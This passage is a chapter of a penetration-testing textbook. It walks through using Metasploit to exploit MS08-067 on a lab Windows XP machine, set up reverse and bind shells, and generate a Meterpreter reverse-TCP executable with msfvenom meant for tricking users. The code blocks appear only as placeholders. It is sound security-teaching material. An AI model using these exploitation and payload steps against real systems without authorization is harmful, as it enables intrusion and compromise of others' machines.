- en: Chapter 4. Using the Metasploit Framework
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: In subsequent chapters, we’ll take an in-depth look at the phases of penetration
    testing, but in this chapter, we’ll dive right in and get some hands-on experience
    with exploitation. Though the information-gathering and reconnaissance phases
    often have more bearing on a pentest’s success than exploitation does, it’s more
    fun to gather shells (a remote connection to an exploited target) or trick users
    into entering their company credentials into your cloned website.
  prefs: []
  type: TYPE_NORMAL
- en: In this chapter we’ll work with the Metasploit Framework, a tool that has become
    the de facto standard for penetration testers. First released in 2003, Metasploit
    has reached cult status in the security community. Though Metasploit is now owned
    by the security company Rapid7, an open source edition is still available, with
    development largely driven by the security community.
  prefs: []
  type: TYPE_NORMAL
- en: Metasploit’s modular and flexible architecture helps developers efficiently
    create working exploits as new vulnerabilities are discovered. As you’ll see,
    Metasploit is intuitive and easy to use, and it offers a centralized way to run
    trusted exploit code that has been vetted for accuracy by the security community.
  prefs: []
  type: TYPE_NORMAL
- en: Why use Metasploit? Say you’ve discovered a vulnerability in your client environment—the
    Windows XP system at 192.168.20.10 is missing Microsoft security bulletin MS08-067\.
    As a penetration tester, it is up to you to exploit this vulnerability, if possible,
    and assess the risk of a compromise.
  prefs: []
  type: TYPE_NORMAL
- en: One approach might be to set up in your lab a Windows XP system that is also
    missing this patch, attempt to trigger the vulnerability, and develop a working
    exploit. But developing exploits by hand takes both time and skill, and the window
    of opportunity for your pentest may be closing.
  prefs: []
  type: TYPE_NORMAL
- en: 'You could instead search for code that exploits this vulnerability on the Internet.
    Sites like Packet Storm Security (*[http://www.packetstormsecurity.com/](http://www.packetstormsecurity.com/)*),
    SecurityFocus (*[http://www.securityfocus.com/](http://www.securityfocus.com/)*),
    and Exploit Database (*[http://www.exploit-db.com/](http://www.exploit-db.com/)*)
    provide repositories of known exploit code. But be forewarned: Not all public
    exploit code does what it claims to do. Some exploit code may destroy the target
    system or even attack your system instead of the target. You should always be
    vigilant when running anything you find online and read through the code carefully
    before trusting it. Additionally, the public exploits you find may not meet your
    needs right out of the box. You may need to do some additional work to port them
    to your pentest environment.'
  prefs: []
  type: TYPE_NORMAL
- en: Whether we develop an exploit from scratch or use a public one as a base, we
    will still need to get that exploit to work on your pentest. Our time will probably
    be better spent on tasks that are difficult to automate, and luckily, we can use
    Metasploit to make exploiting known vulnerabilities such as MS08-067 quick and
    painless.
  prefs: []
  type: TYPE_NORMAL
- en: Starting Metasploit
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Let’s start Metasploit and attack our first system. In Kali Linux, Meta sploit
    is in our path, so we can start it anywhere on the system. But before you start
    Metasploit, you will want to start the PostgreSQL database, which Metasploit will
    use to track what you do.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE0]'
  prefs: []
  type: TYPE_PRE
- en: Now you’re ready to start the Metasploit service. This command creates a PostgreSQL
    user called *msf3* and a corresponding database to store our data. It also starts
    Metasploit’s remote procedure call (RPC) server and web server.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE1]'
  prefs: []
  type: TYPE_PRE
- en: There are multiple interfaces for using Metasploit. In this chapter we’ll use
    Msfconsole, the Metasploit text-based console, and Msfcli, the command line interface.
    Either interface can be used to run Metasploit modules, though I tend to spend
    most of my time in Msfconsole. Start the console by entering **`msfconsole`**.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE2]'
  prefs: []
  type: TYPE_PRE
- en: Don’t be alarmed if Msfconsole appears to hang for a minute or two; it’s loading
    the Metasploit module tree on the fly. Once it’s finished, you’ll be greeted by
    some clever ASCII art, a version listing and other details, and an `msf >` prompt
    (see [Example 4-1](ch04.xhtml#starting_msfconsole "Example 4-1. Starting Msfconsole")).
  prefs: []
  type: TYPE_NORMAL
- en: Example 4-1. Starting Msfconsole
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE3]'
  prefs: []
  type: TYPE_PRE
- en: Notice in [Example 4-1](ch04.xhtml#starting_msfconsole "Example 4-1. Starting
    Msfconsole") that, as of this writing, Metasploit had 1,246 exploits, 678 auxiliary
    modules, and so forth. No doubt by the time you read this, these numbers will
    be even larger. New modules are always being added to Metasploit, and because
    Metasploit is a community-driven project, anyone can submit modules for inclusion
    in the Metasploit Framework. (In fact, in [Chapter 19](ch19.xhtml "Chapter 19. Fuzzing,
    Porting Exploits, and Metasploit Modules"), you’ll learn how to write your own
    modules and gain immortality as a Metasploit author.)
  prefs: []
  type: TYPE_NORMAL
- en: If you’re ever stuck when using Msfconsole, enter `help` for a list of available
    commands and a description of what they do. For more detailed information about
    a specific command, including usage, enter `help` *`<command name>`*.
  prefs: []
  type: TYPE_NORMAL
- en: For example, the help information for using Metasploit’s `route` command is
    shown in [Example 4-2](ch04.xhtml#help_information_in_metasploit "Example 4-2. Help
    information in Metasploit").
  prefs: []
  type: TYPE_NORMAL
- en: Example 4-2. Help information in Metasploit
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE4]'
  prefs: []
  type: TYPE_PRE
- en: Finding Metasploit Modules
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Let’s look at how we might use Metasploit to exploit an unpatched vulnerability
    in our Windows XP target. We will exploit the vulnerability patched in Microsoft
    Security Bulletin MS08-067\. A natural question you may have is, how do we know
    this patch is missing on our Windows XP target? In subsequent chapters, we will
    walk through the steps of discovering this vulnerability as well as several others
    on our target systems. For now, just trust me that this is the vulnerability we
    would like to exploit.
  prefs: []
  type: TYPE_NORMAL
- en: MS08-067 patched an issue in the *netapi32.dll* that could allow attackers to
    use a specially crafted remote procedure call request via the Server Message Block
    (SMB) service to take over a target system. This vulnerability is particularly
    dangerous because it does not require an attacker to authenticate to the target
    machine before running the attack. MS08-067 gained eternal infamy as the vulnerability
    exploited by the Conficker worm, which was widely reported in the media.
  prefs: []
  type: TYPE_NORMAL
- en: Now, if you’re familiar with Microsoft patches, you may recognize that this
    one is from 2008\. Considering its age, you may be surprised to learn how often
    the vulnerability it patched can still lead to success in penetration testing,
    even today, particularly when assessing internal networks. Metasploit’s MS08-067
    module is simple to use and has a high success rate, making it an ideal first
    example. Our first step in using Metasploit is to find a module that exploits
    this particular vulnerability. We have a few options. Usually, a simple Google
    search will find what you need, but Metasploit also has an online database of
    modules (*[http://www.rapid7.com/db/modules/](http://www.rapid7.com/db/modules/)*)
    and a built-in search function that you can use to search for the correct modules.
  prefs: []
  type: TYPE_NORMAL
- en: The Module Database
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: You can use the Metasploit search page to match Metasploit modules to -vulnerabilities
    by Common Vulnerabilities and Exposures (CVE) number, Open Sourced Vulnerability
    Database (OSVDB) ID, Bugtraq ID, or Microsoft Security Bulletin, or you can search
    the full text of the module information for a string. Search for *MS08-067* in
    the Microsoft Security Bulletin ID field, as shown in [Figure 4-1](ch04.xhtml#searching_the_metasploit_auxiliary_modul
    "Figure 4-1. Searching the Metasploit Auxiliary Module & Exploit Database").
  prefs: []
  type: TYPE_NORMAL
- en: '![Searching the Metasploit Auxiliary Module & Exploit Database](httpatomoreillycomsourcenostarchimages2030302.png.jpg)Figure 4-1. Searching
    the Metasploit Auxiliary Module & Exploit Database'
  prefs: []
  type: TYPE_NORMAL
- en: The results of the search, shown in [Figure 4-2](ch04.xhtml#ms08-067_metasploit_module_page
    "Figure 4-2. MS08-067 Metasploit module page"), tell us the module name we need
    as well as information about the module (which we’ll discuss in the next section).
  prefs: []
  type: TYPE_NORMAL
- en: '![MS08-067 Metasploit module page](httpatomoreillycomsourcenostarchimages2030304.png.jpg)Figure 4-2. MS08-067
    Metasploit module page'
  prefs: []
  type: TYPE_NORMAL
- en: The full name of the Metasploit module for the MS08-067 security bulletin is
    shown in the URI bar. In the modules directory of Metasploit, this exploit is
    *exploit/windows/smb/ms08_067_netapi*.
  prefs: []
  type: TYPE_NORMAL
- en: Built-In Search
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: You can also use Metasploit’s built-in search function to find the correct module
    name, as shown in [Example 4-3](ch04.xhtml#searching_for_a_metasploit_module "Example 4-3. Searching
    for a Metasploit module").
  prefs: []
  type: TYPE_NORMAL
- en: Example 4-3. Searching for a Metasploit module
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE5]'
  prefs: []
  type: TYPE_PRE
- en: Again we find that the correct module name for this vulnerability is *exploit/windows/smb/ms08_067_netapi*.
    Once you’ve identified a module to use, enter the `info` command with the module
    name, as shown in [Example 4-4](ch04.xhtml#information_listing_in_metasploit "Example 4-4. Information
    listing in Metasploit").
  prefs: []
  type: TYPE_NORMAL
- en: Example 4-4. Information listing in Metasploit
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE6]'
  prefs: []
  type: TYPE_PRE
- en: This info page tells us a lot.
  prefs: []
  type: TYPE_NORMAL
- en: First we see some basic information about the module, including a descriptive
    name at ❶ followed by the module name at ❷. (The version field formerly denoted
    the SVN revision for the module, but now that Metasploit is hosted on GitHub,
    all modules are set to version 0.)
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**`Platform`** ❸ tells us that this exploit is for Windows systems.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**`Privileged`** ❹ tells us whether this module requires or grants high privileges
    on the target. The `License` is set to Metasploit Framework License (BSD). (Metasploit’s
    license is a three-clause BSD open source license.)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**`Rank`** ❺ lists the exploit’s potential impact on the target. Exploits are
    ranked from manual to excellent. An exploit ranked excellent should never crash
    a service; memory-corruption vulnerabilities such as MS08-067 are usually not
    in this category. Our module is in the great category, one step down. A great
    exploit can automatically detect the correct target and has other features that
    make it more likely to succeed.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**`Available targets`** ❻ lists operating system versions and patch levels
    that the module can exploit. This module has 67 possible targets, including Windows
    2000, Windows 2003, and Windows XP, as well as multiple service and language packs.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**`Basic options`** ❼ lists various options for the module that can be set
    to make a module better meet our needs. For example, the `RHOST` option tells
    Metasploit the IP address of the target. (We’ll discuss the basic options in depth
    in [Setting Module Options](ch04.xhtml#setting_module_options "Setting Module
    Options").)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**`Payload information`** ❽ contains information to help Metasploit decide
    which payloads it can use with this exploit. Payloads, or shellcode, tell the
    exploited system what to do on behalf of the attacker. (The goal of attacking
    a target is, of course, to get it to do something on our behalf that it isn’t
    supposed to do.) Metasploit’s payload system gives us many options for what to
    make the target do.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**`Description`** ❾ includes more details about the particular vulnerability
    that the module exploits.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**`References`** ❿ contains a link to online vulnerability database entries.
    If you’re ever in doubt about which Metasploit module to use for a vulnerability,
    start with its info page.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Having confirmed that this is the right module, tell Metasploit to use this
    module with the command **`use windows/smb/ms08_067_netapi`**. You can drop the
    *exploit/* part of the exploit name; Metasploit will figure out what you want.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE7]'
  prefs: []
  type: TYPE_PRE
- en: Now we’re in the context of the exploit module.
  prefs: []
  type: TYPE_NORMAL
- en: Setting Module Options
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Having chosen our exploit, we need to give Metasploit some information. As you’ll
    see throughout this book, Metasploit can aid you in many aspects of penetration
    testing, but it isn’t a mind reader . . . yet. To see the information Metasploit
    needs from you to run your chosen module, enter **`show options`** ([Example 4-5](ch04.xhtml#exploit_module_options
    "Example 4-5. Exploit module options")).
  prefs: []
  type: TYPE_NORMAL
- en: Example 4-5. Exploit module options
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE8]'
  prefs: []
  type: TYPE_PRE
- en: At the top of the output shown in [Example 4-5](ch04.xhtml#exploit_module_options
    "Example 4-5. Exploit module options") are the module settings and any default
    values, whether certain settings are required for the module to run successfully,
    and a description of each setting.
  prefs: []
  type: TYPE_NORMAL
- en: RHOST
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: The `RHOST` option ❶ refers to the remote host we want to exploit. This option
    is required because it gives Metasploit a target to attack. We’ll tell Metasploit
    to exploit the Windows XP target machine that we set up in [Chapter 1](ch01.xhtml
    "Chapter 1. Setting Up Your Virtual Lab") by changing the `RHOST` option from
    blank to our target IP address. (If you can’t remember what that is, on the Windows
    XP machine run `ipconfig` at the command line to find out.) To set an option enter
    `set` *`<option to set> <value to set it to>`*, so in this case, **`set RHOST
    192.168.20.10`**. (Remember to use your own Windows XP target’s IP address.) After
    issuing this command, running `show options` again should show that the value
    of `RHOST` is set to 192.168.20.10.
  prefs: []
  type: TYPE_NORMAL
- en: RPORT
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: '`RPORT` ❷ refers to the remote port to attack. I remember a former manager
    of mine who spent a good amount of time looking for port 80—as in trying to locate
    it physically. Unsatisfied with my explanation that networking sockets are made
    entirely of code, I eventually just pointed at the Ethernet port. The moral of
    this story is this: A port is just a network socket; it’s not a physical port.
    For example, when you browse to *[www.google.com](http://www.google.com)*, a web
    server somewhere on the Internet is listening on port 80.'
  prefs: []
  type: TYPE_NORMAL
- en: In this case we see that `RPORT` is set to a default value. Because our exploit
    uses the Windows SMB service, the `RPORT` value should probably be 445, the default
    port for SMB. And, as you can see, Metasploit saves us the trouble of having to
    set the value by setting the default to 445 (which you can change if you need
    to). In our case, we can just leave it alone.
  prefs: []
  type: TYPE_NORMAL
- en: SMBPIPE
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Like the `RPORT` value, keep the default for the `SMBPIPE` option ❸ as `BROWSER`.
    This will work just fine for our purposes. (SMB pipes allow us to talk to Windows
    interprocess communication over a network. We’ll look at finding out which SMB
    pipes are listening on our target machines later in this chapter.)
  prefs: []
  type: TYPE_NORMAL
- en: Exploit Target
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: The Exploit Target is set to `0 Automatic Targeting` ❹. This is the target operating
    system and version. You can view the available targets on the module’s info page
    or just show them with the command `show targets` ([Example 4-6](ch04.xhtml#exploit_targets
    "Example 4-6. Exploit targets")).
  prefs: []
  type: TYPE_NORMAL
- en: Example 4-6. Exploit targets
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE9]'
  prefs: []
  type: TYPE_PRE
- en: As you can see in [Example 4-6](ch04.xhtml#exploit_targets "Example 4-6. Exploit
    targets"), this module can attack Windows 2000, Windows 2003, and Windows XP.
  prefs: []
  type: TYPE_NORMAL
- en: Note
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Remember, Microsoft has released patches for all the platforms affected by this
    bug, but keeping all systems in an environment up-to-date with Windows patches
    is easier said than done. Many of your pentesting clients will be missing some
    critical updates in Windows and other software.
  prefs: []
  type: TYPE_NORMAL
- en: We know that our target is running Windows XP SP3 English, so we can wager that
    the correct target number is either 5 or 6, but it won’t always be so easy. Choose
    `Automatic Targeting` to tell Metasploit to fingerprint the SMB service and choose
    the appropriate target based on the results.
  prefs: []
  type: TYPE_NORMAL
- en: To set a target option, enter `set target` *`<target number>`*. In this case
    we’ll leave the module target at the default `Automatic Targeting` and move on.
  prefs: []
  type: TYPE_NORMAL
- en: Payloads (or Shellcode)
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Based on the output of `show options` command, it looks like everything should
    be ready to go at this point, but we’re not quite done yet. We’ve forgotten to
    tell our exploit what to do once the target has been exploited. One of the ways
    that Metasploit makes things easier is by setting up our payloads for us. Metasploit
    has a plethora of payloads, ranging from simple Windows commands to the extensible
    Metasploit Meterpreter (see [Chapter 13](ch13.xhtml "Chapter 13. Post Exploitation")
    for more detailed information on Meterpreter). Just select a compatible payload,
    and Metasploit will craft your exploit string, including the code to trigger the
    vulnerability and the payload to run after exploitation is successful. (We’ll
    look at writing exploits by hand in [Chapter 16](ch16.xhtml "Chapter 16. A Stack-Based
    Buffer Overflow in Linux") through [Chapter 19](ch19.xhtml "Chapter 19. Fuzzing,
    Porting Exploits, and Metasploit Modules").)
  prefs: []
  type: TYPE_NORMAL
- en: Finding Compatible Payloads
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: As of this writing there were 324 payloads in Metasploit, and like exploit modules,
    new payloads are added to the Framework regularly. For instance, as mobile platforms
    take over the world, payloads for iOS and other smartphones are starting to show
    up in Metasploit. But, of course, not all 324 payloads are compatible with our
    chosen exploit. Our Windows system will be a bit confused if it receives instructions
    that are meant for an iPhone. To see compatible payloads, enter **`show payloads`**,
    as shown in [Example 4-7](ch04.xhtml#compatible_payloads "Example 4-7. Compatible
    payloads").
  prefs: []
  type: TYPE_NORMAL
- en: Example 4-7. Compatible payloads
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE10]'
  prefs: []
  type: TYPE_PRE
- en: If you forget to set a payload, you may find that, miraculously, the exploit
    module will just choose the default payload and associated settings and run it
    anyway. Still, you should get in the habit of manually setting a payload and its
    options because the default won’t always fit your needs.
  prefs: []
  type: TYPE_NORMAL
- en: A Test Run
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Let’s keep things simple and send off our exploit with the default payload options
    first, just to see how things work. Enter **`exploit`** to tell Metasploit to
    run the module, as shown in [Example 4-8](ch04.xhtml#running_the_exploit "Example 4-8. Running
    the exploit").
  prefs: []
  type: TYPE_NORMAL
- en: Example 4-8. Running the exploit
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE11]'
  prefs: []
  type: TYPE_PRE
- en: As you can see, we end up with a Meterpreter session. Meterpreter is short for
    *meta-interpreter*, Metasploit’s unique payload. I often describe it as a shell
    on steroids. It can do everything a command shell can do and much, much more.
    We’ll cover Meterpreter in depth in [Chapter 13](ch13.xhtml "Chapter 13. Post
    Exploitation"), but to get a head start, enter **`help`** in the Meterpreter console
    for a list of Meterpreter’s commands.
  prefs: []
  type: TYPE_NORMAL
- en: Note
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Another thing to note about the default options is that Metasploit uses the
    port 4444\. In our lab there is nothing wrong with this. It will work just fine.
    However, on real engagements, if your client is using even primitive intrusion-prevention
    software, it may take note of traffic on port 4444 and say, “Hey, you are Metasploit,
    go away!” and drop your connection.
  prefs: []
  type: TYPE_NORMAL
- en: For now, let’s close our Meterpreter session and learn more about selecting
    payloads manually. As useful as Meterpreter is, you may find yourself in situations
    where it is not the ideal payload to meet your needs. Type **`exit`** into your
    Meterpreter prompt to return to the regular Metasploit console.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE12]'
  prefs: []
  type: TYPE_PRE
- en: Types of Shells
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'In the list of compatible payloads shown in [Example 4-7](ch04.xhtml#compatible_payloads
    "Example 4-7. Compatible payloads"), you see a range of options including command
    shells, Meterpreter, a speech API, or execution of a single Windows command. Meterpreter
    or otherwise, shells fall into two categories: bind and reverse.'
  prefs: []
  type: TYPE_NORMAL
- en: Bind Shells
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: A *bind shell* instructs the target machine to open a command shell and listen
    on a local port. The attack machine then connects to the target machine on the
    listening port. However, with the advent of firewalls, the effectiveness of bind
    shells has fallen because any correctly configured firewall will block traffic
    to some random port like 4444.
  prefs: []
  type: TYPE_NORMAL
- en: Reverse Shells
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: A *reverse shell*, on the other hand, actively pushes a connection back to the
    attack machine rather than waiting for an incoming connection. In this case, on
    our attack machine we open a local port and listen for a connection from our target
    because this reverse connection is more likely to make it through a firewall.
  prefs: []
  type: TYPE_NORMAL
- en: Note
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: You may be thinking, “Was this book written in 2002 or something? My firewall
    has egress filtering.” Modern firewalls allow you to stop outbound connections
    as well as inbound ones. It would be trivial to stop a host in your environment
    from connecting out, for instance, to port 4444\. But say I set up my listener
    on port 80 or port 443\. To a firewall, that will look like web traffic, and you
    know you have to let your users look at Facebook from their workstations or there
    would be mutiny and pandemonium on all sides.
  prefs: []
  type: TYPE_NORMAL
- en: Setting a Payload Manually
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'Let’s select a Windows reverse shell for our payload. Set a payload the same
    way you set the `RHOST` option: `set payload` *`<payload to use>`*.'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE13]'
  prefs: []
  type: TYPE_PRE
- en: Because this is a reverse shell, we need to tell the target where to send the
    shell; specifically, we need to give it the IP address of the attack machine and
    the port we will listen on. Running **`show options`** again, shown in [Example 4-9](ch04.xhtml#module_options_with_a_payload
    "Example 4-9. Module options with a payload"), displays the module as well as
    the payload options.
  prefs: []
  type: TYPE_NORMAL
- en: Example 4-9. Module options with a payload
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE14]'
  prefs: []
  type: TYPE_PRE
- en: '`LHOST` ❶ is our local host on the Kali machine, the IP address we want our
    target machine to connect back to. To find the IP address (if you have forgotten
    it), enter the Linux **`ifconfig`** command directly into Msfconsole.'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE15]'
  prefs: []
  type: TYPE_PRE
- en: Now set the `LHOST` option with **`set LHOST 192.168.20.9`**. Leave the defaults
    for `LPORT`, for the local port to connect back to, as well as for `EXITFUNC`,
    which tells Metasploit how to exit. Now enter **`exploit`**, shown in [Example 4-10](ch04.xhtml#running_the_exploit-id00016
    "Example 4-10. Running the exploit"), to send our exploit off again, and wait
    for the shell to appear.
  prefs: []
  type: TYPE_NORMAL
- en: Example 4-10. Running the exploit
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE16]'
  prefs: []
  type: TYPE_PRE
- en: 'Congratulations: You have successfully exploited your first machine!'
  prefs: []
  type: TYPE_NORMAL
- en: Here’s what happened. When we enter `exploit`, Metasploit opens a listener on
    port 4444 to catch the reverse shell from the target ❶. Then, since we kept the
    target as the default `Automatic Targeting`, Metasploit finger printed the remote
    SMB server and selected the appropriate exploit target for us ❷. Once it selected
    the exploit, Metasploit sent over the exploit string and attempted to take control
    of the target machine and execute our selected payload. Because the exploit succeeds,
    a command shell was caught by our handler.
  prefs: []
  type: TYPE_NORMAL
- en: To close this shell, type ctrl-C and enter **`y`** at the prompt to abort the
    session.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE17]'
  prefs: []
  type: TYPE_PRE
- en: To return to a Meterpreter shell, you can choose a payload with Meterpreter
    in the name such as *windows/meterpreter/reverse_tcp* and exploit the Windows
    XP target again.
  prefs: []
  type: TYPE_NORMAL
- en: Msfcli
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'Now for another way to interact with Metasploit: the command line interface,
    Msfcli. Msfcli is particularly useful when using Metasploit inside scripts and
    for testing Metasploit modules that you’re developing because it lets you run
    a module with a quick, one-line command.'
  prefs: []
  type: TYPE_NORMAL
- en: Getting Help
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: To run Msfcli, first exit Msfconsole by entering `exit`, or just open another
    Linux console. Msfcli is in our path, so we can call it from anywhere. Let’s begin
    by looking at the help menu for Msfcli with **`msfcli -h`** ([Example 4-11](ch04.xhtml#msfcli_help
    "Example 4-11. Msfcli help")).
  prefs: []
  type: TYPE_NORMAL
- en: Example 4-11. Msfcli help
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE18]'
  prefs: []
  type: TYPE_PRE
- en: Unlike with Msfconsole, when using Msfcli, we can tell Metasploit everything
    it needs to know to run our exploit in just one command ❶. Luckily, Msfcli has
    some modes to help us build the final command. For example, the `O` mode ❷ shows
    the selected module’s options, and `P` shows the compatible payloads ❸.
  prefs: []
  type: TYPE_NORMAL
- en: Showing Options
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Let’s use our MS08-067 exploit against our Windows XP target again. According
    to the help page, we need to pass Msfcli the exploit name we want to use and set
    all our options ❶. To show the available options use the `O` mode. Enter **`msfcli
    windows/smb/ms08_067_netapi O`** to see the options for the MS08-067 exploit module,
    as shown in [Example 4-12](ch04.xhtml#module_options "Example 4-12. Module options").
  prefs: []
  type: TYPE_NORMAL
- en: Example 4-12. Module options
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE19]'
  prefs: []
  type: TYPE_PRE
- en: We see the same options as we did in Msfconsole. We’re reminded to set the `RHOST`
    option to the IP address of the target machine, but as we saw on the help page,
    setting options in Msfcli is a little different from doing do in Msfconsole. Here
    we say *`option=value`*. For example, to set `RHOST`, we enter `RHOST=192.168.20.10`.
  prefs: []
  type: TYPE_NORMAL
- en: Payloads
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: For a reminder of the payloads compatible with this module, use the `P` mode.
    Try **`msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 P`**, as shown in
    [Example 4-13](ch04.xhtml#module_payloads_in_msfcli "Example 4-13. Module payloads
    in Msfcli").
  prefs: []
  type: TYPE_NORMAL
- en: Example 4-13. Module payloads in Msfcli
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE20]'
  prefs: []
  type: TYPE_PRE
- en: This time, we’ll use a bind shell payload. Recall that a bind shell just listens
    on a local port on the target machine. It will be up to our attack machine to
    connect to the target machine after the payload has run. Recall from our work
    in Msfconsole that choosing a payload requires additional payload-specific options,
    which we can view again with the `O` flag.
  prefs: []
  type: TYPE_NORMAL
- en: Because our bind shell won’t be calling back to our attack machine, we don’t
    need to set the `LHOST` option, and we can leave the `LPORT` option as the default
    of 4444 for now. It looks like we have everything we need to exploit the Windows
    XP target again. Finally, to tell Msfcli to run the exploit we use the `E` flag
    ([Example 4-14](ch04.xhtml#running_the_exploit_in_msfcli "Example 4-14. Running
    the exploit in Msfcli")).
  prefs: []
  type: TYPE_NORMAL
- en: Example 4-14. Running the exploit in Msfcli
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE21]'
  prefs: []
  type: TYPE_PRE
- en: It looks like everything worked, and we got another shell. But this time, instead
    of starting a reverse handler listening on the specified local port of 4444, Metasploit
    starts a handler for the bind shell ❶. After Metasploit sends over the exploit
    string, the bind handler will automatically connect out to the port specified
    by the payload and connect to the shell. Once again, we have taken control of
    the target machine.
  prefs: []
  type: TYPE_NORMAL
- en: Creating Standalone Payloads with Msfvenom
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: In 2011, Msfvenom was added to Metasploit. Prior to Msfvenom, the tools Msfpayload
    and Msfencode could be used together to create standalone encoded Metasploit payloads
    in a variety of output formats, such as Windows executables and ASP pages. With
    the introduction of Msfvenom, the functionality of Msfpayload and Msfencode was
    combined into a single tool, though Msfpayload and Msfencode are still included
    in Metasploit. To view Msfvenom’s help page, enter **`msfvenom -h`**.
  prefs: []
  type: TYPE_NORMAL
- en: 'So far with Metasploit, our goal has been to exploit a vulnerability on the
    target system and take control of the machine. Now we’ll do something a little
    different. Instead of relying on a missing patch or other security issue, we are
    hoping to exploit the one security issue that may never be fully patched: the
    users. Msfvenom allows you to build standalone payloads to run on a target system
    in an attempt to exploit the user whether through a social-engineering attack
    ([Chapter 11](ch11.xhtml "Chapter 11. Social Engineering")) or by uploading a
    payload to a vulnerable server, as we’ll see in [Chapter 8](ch08.xhtml "Chapter 8. Exploitation").
    When all else fails, the user can often be a way in.'
  prefs: []
  type: TYPE_NORMAL
- en: Choosing a Payload
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: To list all the available payloads, enter **`msfvenom -l payloads`**. We’ll
    use one of Metasploit’s Meterpreter payloads, `windows/meterpreter/reverse_tcp`,
    which provides a reverse connection with a Meterpreter shell. Use `-p` to select
    a payload.
  prefs: []
  type: TYPE_NORMAL
- en: Setting Options
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: To see the correct options to use for a module, enter the `-o` flag after selecting
    a payload, as shown in [Example 4-15](ch04.xhtml#options_in_msfvenom "Example 4-15. Options
    in Msfvenom").
  prefs: []
  type: TYPE_NORMAL
- en: Example 4-15. Options in Msfvenom
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE22]'
  prefs: []
  type: TYPE_PRE
- en: As expected, our `LHOST` needs to be set, and our `LPORT` is set to the default
    4444\. For practice, set `LPORT` to 12345 by entering **`LPORT=12345`**. We also
    see `EXITFUNC`, which we can leave as the default. Because this is a reverse connection
    payload, we need to set our `LHOST` option to tell the target machine where to
    connect back to (our Kali machine).
  prefs: []
  type: TYPE_NORMAL
- en: Choosing an Output Format
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Now tell Msfvenom which output format to use. Will we be running this payload
    from a Windows executable, or do we want to make an ASP file that can be uploaded
    to a web server we have gained write access to? To see all available output formats,
    enter **`msfvenom --help-formats`**.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE23]'
  prefs: []
  type: TYPE_PRE
- en: 'To select the output format, use the `-f` option along with the chosen format:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE24]'
  prefs: []
  type: TYPE_PRE
- en: But if you run this command as is, you’ll see garbage printed to the console.
    While this is technically our executable payload, it doesn’t do us much good.
    Instead, let’s redirect the output to an executable file, *chapter4example.exe*.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE25]'
  prefs: []
  type: TYPE_PRE
- en: There is no output to the screen, but if we run the `file` command on our newly
    created executable file, we see that it’s a Windows executable that will run on
    *any* Windows system as long as a user attempts to run it. (Later, in [Chapter 12](ch12.xhtml
    "Chapter 12. Bypassing Antivirus Applications"), we’ll see cases where antivirus
    applications stop a Metasploit payload and learn ways we can obfuscate our standalone
    payloads to bypass antivirus programs. Also, we will cover clever ways to lure
    users into downloading and running malicious payloads in [Chapter 11](ch11.xhtml
    "Chapter 11. Social Engineering").)
  prefs: []
  type: TYPE_NORMAL
- en: Serving Payloads
